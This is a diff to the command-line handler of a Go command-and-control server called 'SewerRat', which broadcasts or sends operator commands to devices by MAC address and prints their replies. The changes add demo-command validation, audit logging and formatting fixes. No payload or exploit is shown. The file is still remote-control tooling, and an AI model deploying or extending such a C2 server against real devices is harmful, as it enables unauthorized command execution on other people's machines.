@@ -1,11 +1,14 @@
 package server
 
 import (
-	"fmt"
 	"bufio"
+	"fmt"
+	"log"
 	"os"
 	"strings"
 	"time"
+
+	"sewerrat/shared"
 )
 
 // CLIHandler manages the command-line interface for the server
@@ -29,7 +32,7 @@ func (ch *CLIHandler) Start() error {
 	reader := bufio.NewReader(os.Stdin)
 
 	fmt.Println("\n[+] SewerRat C2 Server Active")
-	fmt.Printf("[*] Interface: %s (%s)\n", 
+	fmt.Printf("[*] Interface: %s (%s)\n",
 		ch.broadcaster.GetLocalInterface(),
 		ch.broadcaster.GetSourceMAC())
 	fmt.Printf("[*] Local IP: %s\n", ch.broadcaster.GetSourceIP())
@@ -100,13 +103,18 @@ func (ch *CLIHandler) processCommand(input string) error {
 
 // handleBroadcast sends a command to all devices
 func (ch *CLIHandler) handleBroadcast(command string) error {
+	if err := shared.ValidateDemoCommand(command); err != nil {
+		log.Printf("[AUDIT] blocked broadcast command: %s (%v)\n", shared.SummarizeForAudit(command, shared.AuditPreviewLimit), err)
+		return err
+	}
 	if err := ch.broadcaster.BroadcastCommand(command); err != nil {
 		return err
 	}
+	log.Printf("[AUDIT] operator broadcast command accepted: %s\n", shared.SummarizeForAudit(command, shared.AuditPreviewLimit))
 
 	// Wait for response with timeout
 	fmt.Printf("[*] Waiting for responses (timeout: %v)...\n", ch.timeout)
-	
+
 	deadline := time.Now().Add(ch.timeout)
 	for {
 		remaining := time.Until(deadline)
@@ -116,6 +124,7 @@ func (ch *CLIHandler) handleBroadcast(command string) error {
 
 		select {
 		case resp := <-ch.listener.GetResponseChannel():
+			log.Printf("[AUDIT] response from %s at %s: %s\n", resp.SourceMAC, resp.Timestamp.UTC().Format(time.RFC3339), shared.SummarizeForAudit(resp.Data, shared.AuditPreviewLimit))
 			fmt.Printf("[<<] %s: %s\n", resp.SourceMAC, resp.Data)
 		case <-time.After(remaining):
 			break
@@ -127,13 +136,18 @@ func (ch *CLIHandler) handleBroadcast(command string) error {
 
 // handleSend sends a command to a specific MAC
 func (ch *CLIHandler) handleSend(mac string, command string) error {
+	if err := shared.ValidateDemoCommand(command); err != nil {
+		log.Printf("[AUDIT] blocked targeted command for %s: %s (%v)\n", mac, shared.SummarizeForAudit(command, shared.AuditPreviewLimit), err)
+		return err
+	}
 	if err := ch.broadcaster.SendCommand(mac, command); err != nil {
 		return err
 	}
+	log.Printf("[AUDIT] operator targeted command accepted for %s: %s\n", mac, shared.SummarizeForAudit(command, shared.AuditPreviewLimit))
 
 	// Wait for response
 	fmt.Printf("[*] Waiting for response from %s (timeout: %v)...\n", mac, ch.timeout)
-	
+
 	deadline := time.Now().Add(ch.timeout)
 	for {
 		remaining := time.Until(deadline)
@@ -145,6 +159,7 @@ func (ch *CLIHandler) handleSend(mac string, command string) error {
 		select {
 		case resp := <-ch.listener.GetResponseChannel():
 			if resp.SourceMAC == mac || mac == "ff:ff:ff:ff:ff:ff" {
+				log.Printf("[AUDIT] response from %s at %s: %s\n", resp.SourceMAC, resp.Timestamp.UTC().Format(time.RFC3339), shared.SummarizeForAudit(resp.Data, shared.AuditPreviewLimit))
 				fmt.Printf("[<<] %s: %s\n", resp.SourceMAC, resp.Data)
 			}
 		case <-time.After(remaining):
